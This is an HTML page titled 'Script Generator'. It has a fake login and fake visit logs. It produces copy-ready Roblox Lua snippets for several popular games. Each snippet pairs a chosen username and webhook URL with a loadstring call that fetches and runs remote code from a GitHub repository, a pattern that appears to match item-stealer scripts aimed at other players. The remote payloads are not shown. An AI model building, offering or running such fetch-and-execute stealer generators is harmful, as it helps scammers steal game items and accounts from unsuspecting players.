<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        /* Basic Styles */
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }
        h1 {
            font-size: 3rem;
        }
        .container {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }
        button {
            background: #ff0080;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            font-size: 1rem;
        }
        button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        /* Log Section Styles */
        #log-section {
            margin-top: 20px;
            padding: 10px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
            max-width: 80%;
            width: 100%;
            text-align: center;
        }
        #log-section ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }
        #log-section li {
            margin: 10px;
        }
        /* Script Generation Popup Styles */
        .popup {
            display: none;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
        }
        .popup input, .popup select {
            margin: 10px auto;
            padding: 10px;
            width: 80%;
            border-radius: 8px;
            border: none;
            background-color: #333;
            color: white;
        }
        .popup button {
            background: #ff0080;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            transition: 0.3s;
        }
        .popup button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        /* Generated Script Display */
        #generated-script {
            margin-top: 20px;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
            width: 100%;
            max-width: 600px;
            text-align: left;
            word-wrap: break-word;
            font-family: 'Courier New', Courier, monospace;
        }
        #generated-script pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 1rem;
            margin: 0;
        }
        #copy-btn {
            margin-top: 10px;
            background: #ff0080;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            font-size: 1rem;
        }
        #copy-btn:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>

    <!-- Username Input and Login Button -->
    <input type="text" id="username" placeholder="Enter Username">
    <button id="login-button" onclick="login()">Login</button>

    <!-- Log Section -->
    <div id="log-section" style="display:none;">
        <h2>Login Log</h2>
        <ul id="log-list"></ul>
    </div>

    <!-- Script Generation Popup -->
    <div id="popup" class="popup" style="display:none;">
        <h2>Enter Details</h2>
        <input type="text" id="user-name" placeholder="Username" disabled>
        <input type="text" id="webhook" placeholder="Webhook URL">
        
        <!-- Script Selection Dropdown -->
        <select id="script-select">
            <option value="Blox Fruits">Blox Fruits</option>
            <option value="Murder Mystery 2">Murder Mystery 2</option>
            <option value="Adopt Me">Adopt Me</option>
            <option value="Pet Simulator 99">Pet Simulator 99</option>
            <option value="Pls Donate">Pls Donate</option>
        </select>
        
        <button onclick="generateScript()">Generate Script</button>
        <button onclick="closePopup()">Close</button>
    </div>

    <!-- Generated Script Section -->
    <div id="generated-script" style="display:none;">
        <pre id="script-output"></pre>
        <button id="copy-btn" onclick="copyScript()">Copy All</button>
    </div>

    <script>
        let userInfo = null;
        let loadstrings = {
            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
        };

        // Login function (no authentication required)
        function login() {
            let usernameInput = document.getElementById('username').value;
            if (usernameInput) {
                userInfo = { username: usernameInput }; // Store the username
                displayLoginInfo();
                logVisit();
                openPopup();
            } else {
                alert("Please enter a username!");
            }
        }

        // Display username in the popup
        function displayLoginInfo() {
            document.getElementById('user-name').value = userInfo.username;
        }

        // Open script generation popup
        function openPopup() {
            document.getElementById('popup').style.display = 'block';
        }

        // Close the popup
        function closePopup() {
            document.getElementById('popup').style.display = 'none';
        }

        // Generate script logic
        function generateScript() {
            let webhook = document.getElementById('webhook').value;
            let selectedScript = document.getElementById('script-select').value;

            if (webhook) {
                let script = `Username = "${userInfo.username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
                document.getElementById('script-output').innerText = script;
                document.getElementById('generated-script').style.display = 'block'; // Show generated script section
                closePopup();
            } else {
                alert("Please provide a webhook URL!");
            }
        }

        // Log user's visit (fake logs)
        function logVisit() {
            const logList = document.getElementById('log-list');
            const logItem = document.createElement('li');
            logItem.innerText = `New login: ${userInfo.username} | ${new Date().toLocaleTimeString()}`;
            logList.appendChild(logItem);

            // Show the log section if hidden
            document.getElementById('log-section').style.display = 'block';
        }

        // Copy the generated script to clipboard
        function copyScript() {
            const scriptText = document.getElementById('script-output').innerText;
            navigator.clipboard.writeText(scriptText).then(() => {
                alert("Script copied to clipboard!");
            }).catch(err => {
                console.error('Failed to copy script: ', err);
            });
        }
    </script>
</body>
</html>
